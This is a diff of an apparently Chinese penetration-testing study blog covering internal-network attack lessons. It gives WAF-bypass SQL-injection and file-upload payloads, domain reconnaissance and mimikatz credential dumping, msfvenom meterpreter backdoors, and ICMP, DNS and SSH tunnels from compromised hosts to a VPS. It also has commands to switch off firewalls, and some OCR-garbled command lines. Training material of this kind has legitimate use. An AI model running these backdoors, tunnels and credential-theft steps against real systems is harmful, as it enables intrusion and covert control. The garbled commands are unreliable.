@@ -3649,9 +3649,834 @@
 <p>SQL注入 <a href="https://www.cnblogs.com/cute-puli/p/11146625.html">https://www.cnblogs.com/cute-puli/p/11146625.html</a><br>关键字替换<br>使用like 代替 and<br>更换提交方式：<br>POST id&#x3D;-1 union select 1,2,3–+</p>
 <p>模拟文件上传传递数据<br>分块传输：更改数据请求格式<br>前提提交方式必须为POST<br><a href="https://github.com/cOny1/chunked-coding-converter">https://github.com/cOny1/chunked-coding-converter</a><br>HPP参数污染：id&#x3D;1&#x2F;**&amp;id&#x3D;-1号20 union号203e1ect号201,2,3号23*&#x2F;</p>
 <p>文件上传：换行解析&amp;垃圾溢出&amp;00干扰&amp;&#x3D;符号干扰&amp;参数模拟<br>filename&#x3D;a.php<br>filename&#x3D;”a.php<br>filename&#x3D;“a.php号%00”<br>垃圾数据；filename&#x3D;“a.php”<br>无限filename;filename&#x3D;“a,php”<br>filename&#x3D;&#x3D;“a.php”<br>filename&#x3D;“name&#x3D;’uploadfile.php”6</p>
-<p>filename&#x3D;“Content-Disposition:form-data.php”<br>filename&#x3D;&#x3D;“a.ph<br>p”</p>
+<p>filename&#x3D;“Content-Disposition:form-data.php”<br>filename&#x3D;&#x3D;“a.php”</p>
 <p>BT&amp;Aliyun-文件包含&amp;代码执行-知识点<br><a href="https://github.com/s0md3v/XSStrike">https://github.com/s0md3v/XSStrike</a><br>python xsstrike.py -u<br>“<a href="http://test.xiaodi8.com/pikachu/vul/xss/xss">http://test.xiaodi8.com/pikachu/vul/xss/xss</a> reflected get.php?mes<br>sage&#x3D;1&amp;submit&#x3D;submit”–proxy<br>txt&#x3D;Sy&#x3D;str replace(‘x’,‘’,‘pxhpxinxfo（）’);assert ($y);&amp;submit&#x3D;8688<br>F응90응E4용BA응A4<br>文件包含：没什么好说的就这几种<br>…·&#x2F;…1等</p>
 <p>安全狗：<br>注入ss文件上传拦截<br>rce文件包含等其他不拦截<br>宝塔：<br>注入上传拦截<br>rce文件包含Xss等其他不拦截<br>其中拦截的是关键字<br>aliyun<br>拦截的CC速度和后门信息收集和权限维持阶段拦截<br>漏洞利用他不拦截默认的版本（升级版本没测试）</p>
+<p>由于这段时间去打春秋云镜的内网靶场去了，所以就先看内网的了，后边就是先从内网的知识点开始。</p>
+<h1 id="第122天：内网安全-域信息收集-应用网络凭据-CS插件-Adfind-BloodHound"><a href="#第122天：内网安全-域信息收集-应用网络凭据-CS插件-Adfind-BloodHound" class="headerlink" title="第122天：内网安全-域信息收集&amp;应用网络凭据&amp;CS插件&amp;Adfind&amp;BloodHound"></a>第122天：内网安全-域信息收集&amp;应用网络凭据&amp;CS插件&amp;Adfind&amp;BloodHound</h1><h4 id="知识点：-56"><a href="#知识点：-56" class="headerlink" title="#知识点："></a>#知识点：</h4><p>1、域产生原因</p>
+<p>2、内网域的区别</p>
+<p>3、如何判断在域内</p>
+<p>4、域内常见信息收集</p>
+<p>5、域内自动化工具收集</p>
+<p>-局域网&amp;工作组&amp;域环境区别</p>
+<p>-域环境信息收集-应用&amp;网络&amp;服务&amp;凭据等</p>
+<p>-自动化工具使用-CS 插件&amp;Adfind&amp;BloodHound</p>
+<p>0x01</p>
+<p>一个具有一定规模的企业，每天都可能面临员工入职和离职，因此网络管理部门经常需要</p>
+<p>对域成员主机进行格式化消除磁盘的文件，然后重装系统及软件，以提供给新员工使用；</p>
+<p>因此，为了便于后期交接，大多网络管理员会做好一个系统镜像盘，统一安装所有的电</p>
+<p>脑，并且在安装的时候设置惯用、甚至统一的密码。</p>
+<p>0x02</p>
+<p>因此，域中的计算机本地管理员账号，极有可能能够登陆域中较多的计算机，本地管理员</p>
+<p>的密码在服务器上后期修改的概率，远低于在个人办公电脑上的概率，而域用户权限是较</p>
+<p>低的，是无法在域成员主机上安装软件的，这将会发生下面的一幕：</p>
+<p>某个域用户需要使用 viso 软件进行绘图操作，于是联系网络管理员进行安装，网络管理</p>
+<p>员采用域管理员身份登录了域成员主机，并帮助其安装了 viso 软件，于是这个有计算机</p>
+<p>基础的员工，切换身份登录到了本地计算机的管理员，后执行 mimikatz，从内存当中抓</p>
+<p>取了域管理员的密码，便成功的控制了整个域。</p>
+<p>0x03</p>
+<p>因此，域渗透的思路就是：通过域成员主机，定位出域控制器 IP 及域管理员账号，利用</p>
+<p>域成员主机作为跳板，扩大渗透范围，利用域管理员可以登陆域中任何成员主机的特性，</p>
+<p>定位出域管理员登陆过的主机 IP，设法从域成员主机内存中 dump 出域管理员密码，进</p>
+<p>而拿下域控制器、渗透整个内网。</p>
+<p>–当前机器角色的判断</p>
+<p>–当前机器网络环境判断</p>
+<p>–当前机器角色功能判断</p>
+<p>网络环境-局域网&amp;工作组&amp;域环境</p>
+<p>机器角色-个人 PC&amp;文件服务器&amp;邮件服务器等</p>
+<p>角色功能-任务&amp;端口&amp;服务&amp;密码&amp;漏洞&amp;配置等</p>
+<p>网络环境-局域网-工作组&amp;域环境</p>
+<p>机器角色-个人PC&amp;文件服务器&amp;邮件服务器等</p>
+<p>角色功能-任务&amp;端口&amp;服务&amp;密码&amp;漏洞&amp;配置等</p>
+<h4 id="演示案例：-51"><a href="#演示案例：-51" class="headerlink" title="演示案例："></a>演示案例：</h4><p> 常规信息类收集-应用&amp;服务&amp;权限等</p>
+<p> 架构信息类收集-网络&amp;用户&amp;域控等</p>
+<p> 关键信息类收集-密码&amp;凭据&amp;口令等</p>
+<p> 自动化工具探针-插件&amp;Adfind&amp;BloodHound</p>
+<p>#常规信息类收集-应用&amp;服务&amp;权限等</p>
+<p>更多其他收集见上图命令表</p>
+<p>systeminfo 详细信息</p>
+<p>netstat -ano 端口列表</p>
+<p>route print 路由表</p>
+<p>net start 启动服务</p>
+<p>tasklist 进程列表</p>
+<p>schtasks 计划任务</p>
+<p>ipconfig &#x2F;all 判断存在域</p>
+<p>net view &#x2F;domain 判断存在域</p>
+<p>net time &#x2F;domain 判断主域</p>
+<p>netstat -ano 当前网络端口开放</p>
+<p>nslookup 域名 追踪来源地址</p>
+<p>wmic service list brief 查询本机服务</p>
+<p>net config workstation 查询当前登录域及登录用户信息</p>
+<p>wmic startup get command,caption 查看已启动的程序信息</p>
+<p>#架构信息类收集-网络&amp;用户&amp;域控等</p>
+<p>net view &#x2F;domain 查询域列表</p>
+<p>net time&#x2F;domain 从域控查询时间，若当前用户是域用户会从域控返回当前时间，亦</p>
+<p>用来判 断主域，主域一般用做时间服务器</p>
+<p>net localgroup administrators 本机管理员【通常含有域用户】</p>
+<p>net user &#x2F;domain 查询域用户(当前域)</p>
+<p>net group &#x2F;domain 查询域工作组</p>
+<p>net group “domain computers” &#x2F;domain 查看加入域的所有计算机名</p>
+<p>net group “domain admins” &#x2F;domain 查询域管理员用户组和域管用户</p>
+<p>net localgroup administrators &#x2F;domain 查看域管理员</p>
+<p>net group “domain controllers” &#x2F;domain 查看域控</p>
+<p>net accounts &#x2F;domain 查看域密码策略</p>
+<p>#关键信息类收集-密码&amp;凭据&amp;口令等</p>
+<p>旨在收集各种密文，明文，口令等，为后续横向渗透做好测试准备</p>
+<p>计算机用户 HASH，明文获取-mimikatz(win)，mimipenguin(linux)</p>
+<p>计算机各种协议服务口令获取-LaZagne(all)，XenArmor(win)，CS 插件</p>
+<p><a href="https://github.com/gentilkiwi/mimikatz/">https://github.com/gentilkiwi/mimikatz/</a></p>
+<p><a href="https://github.com/AlessandroZ/LaZagne/">https://github.com/AlessandroZ/LaZagne/</a></p>
+<p><a href="https://github.com/huntergregal/mimipenguin">https://github.com/huntergregal/mimipenguin</a></p>
+<p><a href="https://xenarmor.com/allinone-password-recovery-pro-software/">https://xenarmor.com/allinone-password-recovery-pro-software/</a></p>
+<p>主要介绍一下域是什么，有什么用，怎么去利用</p>
+<h1 id="第123天：内网安全-域防火墙-入站出站规则-不出网隧道上线-组策略对象同步"><a href="#第123天：内网安全-域防火墙-入站出站规则-不出网隧道上线-组策略对象同步" class="headerlink" title="第123天：内网安全-域防火墙&amp;入站出站规则&amp;不出网隧道上线&amp;组策略对象同步"></a>第123天：内网安全-域防火墙&amp;入站出站规则&amp;不出网隧道上线&amp;组策略对象同步</h1><h4 id="知识点：-57"><a href="#知识点：-57" class="headerlink" title="#知识点："></a>#知识点：</h4><p>0、防火墙组策略对象         入规则严格，出规则宽松</p>
+<p>1、OSI 七层协议模型</p>
+<p>2、正反向监听器说明        我去连接你为正向</p>
+<p>3、隧道技术分层协议</p>
+<p>4、CS&amp;MSF&amp;控制上线</p>
+<p>-隧道技术：解决不出网协议上线的问题（利用出网协议进行封装出网）</p>
+<p>我个人使用的是stowaway，这里工具有很多，自己选择即可</p>
+<p>-代理技术：解决网络通讯不通的问题（利用跳板机建立节点后续操作）</p>
+<h4 id="系列点："><a href="#系列点：" class="headerlink" title="#系列点："></a>#系列点：</h4><p>1、判断什么时候用代理</p>
+<p>2、判断什么时候用隧道</p>
+<p>3、判断出网和不出网协议</p>
+<p>4、如何使用代理建立节点并连接</p>
+<p>5、如何使用隧道技术封装协议上线</p>
+<p>6、判断哪些代理或隧道情况选择放弃</p>
+<h4 id="演示案例：-52"><a href="#演示案例：-52" class="headerlink" title="演示案例："></a>演示案例：</h4><p> 单机-防火墙-限制端口出入站</p>
+<p> 单机-防火墙-限制协议出入站</p>
+<p> 域控-防火墙-组策略对象同步</p>
+<p> 域控-防火墙-组策略不出网上线</p>
+<h4 id="单机-防火墙-限制端口出入站"><a href="#单机-防火墙-限制端口出入站" class="headerlink" title="#单机-防火墙-限制端口出入站"></a>#单机-防火墙-限制端口出入站</h4><p>熟悉常见主机配置不出网的方式</p>
+<p>1、入站&amp;出站&amp;连接安全</p>
+<p>2、域&amp;专用&amp;公网&amp;状态</p>
+<p>3、阻止&amp;允许&amp;其他配置</p>
+<h4 id="单机-防火墙-限制协议出入站"><a href="#单机-防火墙-限制协议出入站" class="headerlink" title="#单机-防火墙-限制协议出入站"></a>#单机-防火墙-限制协议出入站</h4><p>熟悉常见主机配置不出网的方式</p>
+<p>1、程序&amp;端口&amp;预定义&amp;自定义</p>
+<p>2、协议&amp;TCP&amp;UDP&amp;ICMP&amp;L2TP 等</p>
+<h4 id="域控-防火墙-组策略对象同步"><a href="#域控-防火墙-组策略对象同步" class="headerlink" title="#域控-防火墙-组策略对象同步"></a>#域控-防火墙-组策略对象同步</h4><p>熟悉常见主机配置不出网的操作流程</p>
+<p>操作：组策略管理-域-创建 GPO 链接-防火墙设置</p>
+<p>更新策略：强制&amp;命令&amp;重启</p>
+<p>命令：gpupdate&#x2F;force</p>
+<p>#域控-防火墙-组策略不出网上线</p>
+<p>背景介绍：域控通过组策略设置防火墙规则同步后，域内用户主机被限制 TCP 出网，其</p>
+<p>中规则为出站规则，安全研究者通过入站取得 SHELL 权限，需要对其进行上线控制。</p>
+<p>思路：正向连接&amp;隧道技术</p>
+<p>如果是入站被限制呢？反向连接&amp;隧道技术也可以解决（前提看限制的多不多）</p>
+<p>ICMP 协议项目：</p>
+<p><a href="https://github.com/esrrhs/spp">https://github.com/esrrhs/spp</a></p>
+<p><a href="https://github.com/bdamele/icmpsh">https://github.com/bdamele/icmpsh</a></p>
+<p><a href="https://github.com/esrrhs/pingtunnel">https://github.com/esrrhs/pingtunnel</a></p>
+<p>1、CS-ICMP-上线</p>
+<p>VPS:</p>
+<p>.&#x2F;pingtunnel -type server</p>
+<p>肉鸡：(管理器运行)</p>
+<p>pingtunnel.exe -type client -l 127.0.0.1:6666 -s 192.168.46.66 -t </p>
+<p>192.168.46.66:7777 -tcp 1 -noprint 1 -nolog 1</p>
+<p>CS:</p>
+<p>监听器 1：127.0.0.1 6666</p>
+<p>监听器 2：192.168.46.66 7777</p>
+<p>生成监听器 1 的 Stager 后门肉鸡执行</p>
+<p>2、MSF上线<br>生成后门:<br>msfvenom p windows&#x2F;meterpreter&#x2F;reverse tcp HOST&#x3D;127.0.0.1<br>LPORT&#x3D;3333 -f exe &gt; xd.exe<br>MS&#x3D;启动监听:<br>msfconso1e<br>use exploit&#x2F;multi&#x2F;handler<br>set payload windows&#x2F;meterpreter&#x2F;reverse tep<br>get lhest 0.0.0.0<br>set lport 4444<br>exploit<br>a11开启隧道:<br>&#x2F;pingtunnel -type server</p>
+<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-05-11/42d2d6e5485a227110735fafee311311--dfb4--image-20240511083406029.png" alt="image-20240511083406029"></p>
+<h1 id="第124天：内网安全-代理Socks协议-路由不出网-后渗透通讯-CS-MSF控制上线"><a href="#第124天：内网安全-代理Socks协议-路由不出网-后渗透通讯-CS-MSF控制上线" class="headerlink" title="第124天：内网安全-代理Socks协议&amp;路由不出网&amp;后渗透通讯&amp;CS-MSF控制上线"></a>第124天：内网安全-代理Socks协议&amp;路由不出网&amp;后渗透通讯&amp;CS-MSF控制上线</h1><h4 id="知识点：-58"><a href="#知识点：-58" class="headerlink" title="#知识点："></a>#知识点：</h4><p>1、代理软件使用-Win&amp;Linux</p>
+<p>2、代理协议使用-Socks4&#x2F;5</p>
+<p>3、CS&amp;MSF-网络通讯&amp;控制上线</p>
+<p>-隧道技术：解决不出网协议上线的问题（利用出网协议进行封装出网）</p>
+<p>-代理技术：解决网络通讯不通的问题（利用跳板机建立节点后续操作）</p>
+<p>-连接方向：正向&amp;反向（基础课程有讲过）</p>
+<h4 id="系列点：-1"><a href="#系列点：-1" class="headerlink" title="#系列点："></a>#系列点：</h4><p>1、判断什么时候用代理         </p>
+<p>2、判断什么时候用隧道</p>
+<p>3、判断出网和不出网协议</p>
+<p>4、如何使用代理建立节点并连接</p>
+<p>5、如何使用隧道技术封装协议上线</p>
+<p>6、判断哪些代理或隧道情况选择放弃</p>
+<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-05-11/67e4aaa79b879330b771633d8535143b--cf65--image-20240511083808897.png" alt="image-20240511083808897"></p>
+<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-05-11/6344854276615d72961db5c984fa1edc--d69d--image-20240511084449143.png" alt="image-20240511084449143"></p>
+<h4 id="演示案例：-53"><a href="#演示案例：-53" class="headerlink" title="演示案例："></a>演示案例：</h4><p> 网络通讯-MSF&amp;CS-路由添加&amp;节点建立</p>
+<p> 控制上线-MSF&amp;CS-协议生成&amp;正反连接</p>
+<h4 id="网络通讯-MSF-CS-路由添加-节点建立"><a href="#网络通讯-MSF-CS-路由添加-节点建立" class="headerlink" title="#网络通讯-MSF&amp;CS-路由添加&amp;节点建立"></a>#网络通讯-MSF&amp;CS-路由添加&amp;节点建立</h4><h4 id="控制上线-MSF-CS-协议生成-正反连接"><a href="#控制上线-MSF-CS-协议生成-正反连接" class="headerlink" title="#控制上线-MSF&amp;CS-协议生成&amp;正反连接"></a>#控制上线-MSF&amp;CS-协议生成&amp;正反连接</h4><p>代理协议：</p>
+<p>SOCKS4&#x2F;5</p>
+<p>代理软件：</p>
+<p>SocksCap Proxifier ProxyChains 等</p>
+<p>MSF 通讯</p>
+<p>1、添加路由 限于 MSF</p>
+<p>查看路由信息</p>
+<p>run autoroute -p</p>
+<p>run post&#x2F;multi&#x2F;manage&#x2F;autoroute</p>
+<p>添加指定路由，1 是接收的 session 编号</p>
+<p>route add 192.168.11.0 255.255.255.0 1</p>
+<p>2、Sock 代理 全局同用</p>
+<p>use auxiliary&#x2F;server&#x2F;socks_proxy</p>
+<p>set srvhost 0.0.0.0</p>
+<p>set srvport 1115</p>
+<p>run</p>
+<p>启用代理软件配置 Sock5 代理</p>
+<p>CS 通讯</p>
+<p>命令：socks 59578</p>
+<p>操作：代理转发-Socks 代理</p>
+<p>MSF 控制上线-正向连接</p>
+<p>msfvenom -p windows&#x2F;meterpreter&#x2F;bind_tcp LHOST&#x3D;0.0.0.0 LPORT&#x3D;3333 </p>
+<p>-f exe &gt; bd.exe</p>
+<p>use exploit&#x2F;multi&#x2F;handler</p>
+<p>set payload windows&#x2F;meterpreter&#x2F;bind_tcp</p>
+<p>set rhost 192.168.11.129</p>
+<p>set lport 3333</p>
+<p>run</p>
+<p>CS 控制上线-正向连接</p>
+<p>监听器：bind_tcp port</p>
+<p>命令：connect ip port</p>
+<p>实验 2：二层（后续多层操作一致）</p>
+<p>代理软件犖镫澌<br>Sockscap Proxifier Proxychains等</p>
+<p>MSF通讯<br>1、添加路由 限于MSF<br>查看路由信息<br>run autoroute -p<br>run post&#x2F;multi&#x2F;manage&#x2F;autorcute<br>添加指定路由，1是接收的session编号<br>route add 192.168 11.0 255.255.255.0 1<br>2、sock代理 全局同用<br>use auxiliary&#x2F;server&#x2F;socks_proxy<br>set srvhost 0.0.0.0<br>set srvport 1115<br>run<br>启用代理软件配置Socks5代理<br>cs通讯<br>命令:Socks5 59578<br>操作:代理转发-Socks代理<br>MSE控制上线-正向连接<br>msfvenom p windows&#x2F;meterpreter&#x2F;bind_tcp LHOST&#x3D;0.0.0.0 PORT&#x3D;3333</p>
+<p>-f exe &gt; bd.exe<br>use exploit&#x2F;multi&#x2F;handler<br>set payload windows&#x2F;meterpreter&#x2F;bind_tcp<br>set rhost 192.168.11.129<br>set lport 3333<br>run<br>cs控制上线-正向连接<br>监听器:bind tcp port<br>命令:connect ip port</p>
+<h1 id="第125天：内网安全-隧道技术-SMB-ICMP-正反向连接-防火墙出入规则上线"><a href="#第125天：内网安全-隧道技术-SMB-ICMP-正反向连接-防火墙出入规则上线" class="headerlink" title="第125天：内网安全-隧道技术&amp;SMB&amp;ICMP&amp;正反向连接&amp;防火墙出入规则上线"></a>第125天：内网安全-隧道技术&amp;SMB&amp;ICMP&amp;正反向连接&amp;防火墙出入规则上线</h1><h4 id="知识点：-59"><a href="#知识点：-59" class="headerlink" title="#知识点："></a>#知识点：</h4><p>1、入站规则不出网上线方案</p>
+<p>2、出站规则不出网上线方案</p>
+<p>3、规则-隧道技术-SMB&amp;ICMP</p>
+<p>-隧道技术：解决不出网协议上线的问题（利用出网协议进行封装出网）</p>
+<p>-代理技术：解决网络通讯不通的问题（利用跳板机建立节点后续操作）</p>
+<p>-连接方向：正向&amp;反向（基础课程有讲过）</p>
+<h4 id="系列点：-2"><a href="#系列点：-2" class="headerlink" title="#系列点："></a>#系列点：</h4><p>1、判断什么时候用代理</p>
+<p>2、判断什么时候用隧道</p>
+<p>3、判断出网和不出网协议</p>
+<p>4、如何使用代理建立节点并连接</p>
+<p>5、如何使用隧道技术封装协议上线</p>
+<p>6、判断哪些代理或隧道情况选择放弃</p>
+<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-05-11/dd504fe86d60d41e5d808e194e458ce4--d9ee--image-20240511090624508.png" alt="image-20240511090624508"></p>
+<h4 id="演示案例：-54"><a href="#演示案例：-54" class="headerlink" title="演示案例："></a>演示案例：</h4><p> 不出网-控制上线-CS-反向连接</p>
+<p> 不出网-控制上线-CS-SMB 隧道</p>
+<p> 不出网-控制上线-CS-ICMP 隧道</p>
+<p> 不出网-控制上线-CS-关闭防火墙</p>
+<p><strong>windows是建立SMB通道 ，linux建立SSH通道</strong></p>
+<p><strong>怎么知道对方是出站限制还是入站限制呢？</strong><br>上传正向和反向木马进行测试</p>
+<p><strong>不出网-控制上线-CS-ICMP隧道</strong><br>使用icmp隧道绕过出站限制，细节见上一章内容<br>注：win10作为pingtunnel服务端，其他操作类似<br>……</p>
+<p><strong>不出网-控制上线-CS-关闭防火墙</strong><br>如果取得目标机的高权限且，修改防火墙规则，关闭防火墙，以及替换防火墙规则里程序。<br>适用于：<br>1.单纯的内网环境(类似本次实验环境)，不是域环境<br>2.单纯的内网域环境(但是域控DC没有设置组策略防火墙同步)</p>
+<p>入站过滤上线：</p>
+<p>1、隧道技术硬刚</p>
+<p>2、反向连接跳过</p>
+<p>3、关闭&amp;删除&amp;替换</p>
+<p>适用利用入站通行拿到的高权限</p>
+<p>出站过滤上线：</p>
+<p>1、隧道技术硬刚</p>
+<p>2、正向连接跳过</p>
+<p>3、关闭&amp;删除&amp;替换</p>
+<p>适用利用入站通行拿到的高权限</p>
+<p>隧道技术上线：</p>
+<p>HTTP&#x2F;S &amp; DNS &amp; SSH &amp; ICMP &amp; SMB &amp; 协议穿透等</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Windows 防火墙命令：</span><br><span class="line"></span><br><span class="line">https://www.cnblogs.com/tomtellyou/p/16300557.html</span><br><span class="line"></span><br><span class="line">查看当前防火墙状态：netsh advfirewall show allprofiles</span><br><span class="line"></span><br><span class="line">关闭防火墙：netsh advfirewall set allprofiles state off</span><br><span class="line"></span><br><span class="line">开启防火墙：netsh advfirewall set allprofiles state on</span><br><span class="line"></span><br><span class="line">恢复初始防火墙设置：netsh advfirewall reset</span><br><span class="line"></span><br><span class="line">启用桌面防火墙: netsh advfirewall set allprofiles state on</span><br><span class="line"></span><br><span class="line">设置默认输入和输出策略：netsh advfirewall set allprofiles firewallpolicy,allowinbound,allowoutbound</span><br><span class="line"></span><br><span class="line">如果设置为拒绝使用 blockinbound,blockoutbound</span><br></pre></td></tr></table></figure>
+
+<h1 id="第126天：内网安全-隧道技术-SSH-DNS-ICMP-SMB-上线通讯Linux-Mac"><a href="#第126天：内网安全-隧道技术-SSH-DNS-ICMP-SMB-上线通讯Linux-Mac" class="headerlink" title="第126天：内网安全-隧道技术&amp;SSH&amp;DNS&amp;ICMP&amp;SMB&amp;上线通讯Linux&amp;Mac"></a>第126天：内网安全-隧道技术&amp;SSH&amp;DNS&amp;ICMP&amp;SMB&amp;上线通讯Linux&amp;Mac</h1><h4 id="知识点：-60"><a href="#知识点：-60" class="headerlink" title="#知识点："></a>#知识点：</h4><p>1、入站规则不出网上线方案</p>
+<p>2、出站规则不出网上线方案</p>
+<p>3、隧道技术-SMB&amp;ICMP&amp;DNS&amp;SSH</p>
+<p>4、控制上线-Linux&amp;Mac&amp;IOS&amp;Android</p>
+<p>-连接方向：正向&amp;反向（基础课程有讲过）</p>
+<p>-内网穿透：解决网络控制上线&amp;网络通讯问题</p>
+<p>-隧道技术：解决不出网协议上线的问题（利用出网协议进行封装出网）</p>
+<p>-代理技术：解决网络通讯不通的问题（利用跳板机建立节点后续操作）</p>
+<h4 id="系列点：-3"><a href="#系列点：-3" class="headerlink" title="#系列点："></a>#系列点：</h4><p>1、判断什么时候用代理</p>
+<p>2、判断什么时候用隧道</p>
+<p>3、判断出网和不出网协议</p>
+<p>4、如何使用代理建立节点并连接</p>
+<p>5、如何使用隧道技术封装协议上线</p>
+<p>6、判断哪些代理或隧道情况选择放弃</p>
+<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-05-11/63f4b1a104567b33b43cd8c1f8be375b--3e6f--image-20240511091624701.png" alt="image-20240511091624701"></p>
+<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-05-11/19753b8cfc1445cd20e5cd78f4224ff4--c9fc--image-20240511091655868.png" alt="image-20240511091655868"></p>
+<h4 id="演示案例：-55"><a href="#演示案例：-55" class="headerlink" title="演示案例："></a>演示案例：</h4><p> 隧道技术-SMB 协议-判断&amp;通讯&amp;上线</p>
+<p> 隧道技术-ICMP 协议-判断&amp;通讯&amp;上线</p>
+<p> 隧道技术-DNS 协议-判断&amp;通讯&amp;上线</p>
+<p> 隧道技术-SSH 协议-判断&amp;通讯&amp;上线</p>
+<p> 控制上线-插件-Linux&amp;Mac&amp;IOS&amp;Android</p>
+<p>1、判断出网协议</p>
+<p>2、使用出网协议建立隧道</p>
+<p>#SMB 隧道&amp;通讯&amp;上线</p>
+<p>判断：445 通讯</p>
+<p>上线：借助通讯后绑定上线</p>
+<p>通讯：直接 SMB 协议通讯即可</p>
+<p>#ICMP 隧道&amp;通讯&amp;上线</p>
+<p>判断：ping 命令</p>
+<p>上线：见前面课程</p>
+<p>通讯：其他项目(icmpsh icmptunnel)</p>
+<p><a href="https://github.com/esrrhs/spp">https://github.com/esrrhs/spp</a></p>
+<p><a href="https://github.com/bdamele/icmpsh">https://github.com/bdamele/icmpsh</a></p>
+<p><a href="https://github.com/esrrhs/pingtunnel">https://github.com/esrrhs/pingtunnel</a></p>
+<p>#DNS 隧道&amp;通讯&amp;上线</p>
+<p>判断：nslookup dig</p>
+<p>1、上线环境：内网主机只出网 DNS 协议数据，解决上线</p>
+<p>-域名申请及配置</p>
+<p>-监听器创建及配置</p>
+<p>-后门绑定监听器及生成</p>
+<p>2、通讯环境：</p>
+<p>内网主机只出网 DNS 协议数据，解决通讯</p>
+<p><a href="https://github.com/yarrick/iodine">https://github.com/yarrick/iodine</a></p>
+<p>判断出网：nslookup <a href="http://www.baidu.com/">www.baidu.com</a></p>
+<p>-服务器：设置密码 xiaodi 并创建虚拟 IP 及绑定域名指向</p>
+<p>iodined -f -c -P xiaodi 192.168.0.1 ns1.xiaodi8.com -DD</p>
+<p>设置密码 xiaodi 并创建虚拟 IP 及绑定域名指向</p>
+<p>-客户端：连接密码 xiaodi 并绑定域名指向</p>
+<p>iodine -f -M 200 -P xiaodi ns1.xiaodi8.com</p>
+<p>-尝试通讯尝试连接：</p>
+<p>ssh <a href="mailto:&#x72;&#111;&#x6f;&#116;&#x40;&#49;&#57;&#50;&#46;&#x31;&#x36;&#x38;&#x2e;&#48;&#46;&#x32;">&#x72;&#111;&#x6f;&#116;&#x40;&#49;&#57;&#50;&#46;&#x31;&#x36;&#x38;&#x2e;&#48;&#46;&#x32;</a></p>
+<p>#SSH 隧道&amp;通讯</p>
+<p>判断：ssh 连接</p>
+<p>1、上线：</p>
+<p>由于 CS 无 SSH 协议监听器配置，无法上线</p>
+<p>2、通讯：</p>
+<p>由于SSH协议存在于Linux系统，跳板机必须Linux</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">iptables -F /* 清除所有规则 /</span><br><span class="line">iptables -A INPUT -p tcp --dport 22 -j ACCEPT /允许包从22端口进入/</span><br><span class="line">iptables -A OUTPUT -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT /允许从22端口进入的包返回/</span><br><span class="line">iptables -A OUTPUT -p udp --dport 53 -j ACCEPT / 域名解析端口，一般不开 /</span><br><span class="line">iptables -A INPUT -p udp --sport 53 -j ACCEPT / 域名解析端口，一般不开 /</span><br><span class="line">iptables -A INPUT -s 127.0.0.1 -d 127.0.0.1 -j ACCEPT /允许本机访问本机/</span><br><span class="line">iptables -A OUTPUT -s 127.0.0.1 -d 127.0.0.1 -j ACCEPT</span><br><span class="line">iptables -A INPUT -p tcp -s 0/0 --dport 80 -j ACCEPT /允许所有IP访问80端口/</span><br><span class="line">iptables -A OUTPUT -p tcp --sport 80 -m state --state ESTABLISHED -j ACCEPT</span><br><span class="line">iptables-save &gt; /etc/sysconfig/iptables /保存配置/</span><br><span class="line">iptables -L / 显示iptables列表 */</span><br></pre></td></tr></table></figure>
+
+<p>开启ssh协议登录：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vi /etc/ssh/sshd_config</span><br><span class="line">PermitRootLogin yes</span><br><span class="line">PasswordAuthentication yes</span><br><span class="line">/etc/init.d/ssh start</span><br><span class="line">/etc/init.d/ssh restart</span><br></pre></td></tr></table></figure>
+
+<p>本地：入站封<br>将本地访问 10.10.10.132的流量转发至公网vps 1234端口上</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -CfNg -R 1122:10.10.10.132:8080 root@47.94.130.xx</span><br><span class="line">curl http://127.0.0.1:1122</span><br></pre></td></tr></table></figure>
+
+<p>远程：出站封<br>将本地访问10.10.10.132的流量转发至本地的1234的端口上</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -CfNg -L 1234:10.10.10.132:8080 root@10.10.10.146</span><br><span class="line">curl http://127.0.0.1:1234</span><br></pre></td></tr></table></figure>
+
+<p>防御DNS隧道攻击的方法<br>禁止网络中任何人向外部服务器发送DNS请求，只允许与受信任的DNS服务器通信。<br>虽然没有人会将TXT解析请求发送给DNS服务器，但是邮件服务器&#x2F;网关会这样做，因此，可以将邮件服务器&#x2F;网关列入白名单并阻止传入和传出流量中的TXT请求。<br>跟踪用户的DNS查询次数，如果达到阈值，就生成相应的报告</p>
+<p>控制上线-插件-Linux&amp;Mac&amp;IOS&amp;Android<br>项目：<a href="https://github.com/gloxec/CrossC2">https://github.com/gloxec/CrossC2</a><br>面向Linux Mac IOS Android系统上线支持<br>1、插件使用<br>2、命令使用<br>使用参考：<br><a href="https://gloxec.github.io/CrossC2/zh_cn/">https://gloxec.github.io/CrossC2/zh_cn/</a><br>1、下载对应版本加载器和CNA插件<br>2、上传加载器文件和本地加载CNA插件<br>3、修改CNA插件配置路径及上传Key文件<br>4、使用命令或插件绑定HTTPS监听器生成</p>
+<p>使用CS4.7版本没有搭建成功</p>
+<h1 id="第127天：内网安全-隧道搭建-穿透上线-FRP-NPS-SPP-Ngrok-EW项目"><a href="#第127天：内网安全-隧道搭建-穿透上线-FRP-NPS-SPP-Ngrok-EW项目" class="headerlink" title="第127天：内网安全-隧道搭建&amp;穿透上线&amp;FRP&amp;NPS&amp;SPP&amp;Ngrok&amp;EW项目"></a>第127天：内网安全-隧道搭建&amp;穿透上线&amp;FRP&amp;NPS&amp;SPP&amp;Ngrok&amp;EW项目</h1><h4 id="知识点：-61"><a href="#知识点：-61" class="headerlink" title="#知识点："></a>#知识点：</h4><p>1、内网隧道&amp;穿透&amp;加密&amp;上线</p>
+<p>2、项目-Ngrok&amp;Frp&amp;Nps&amp;Spp</p>
+<p>-连接方向：正向&amp;反向（基础课程有讲过）</p>
+<p>-内网穿透：解决网络控制上线&amp;网络通讯问题</p>
+<p>-隧道技术：解决不出网协议上线的问题（利用出网协议进行封装出网）</p>
+<p>-代理技术：解决网络通讯不通的问题（利用跳板机建立节点后续操作）</p>
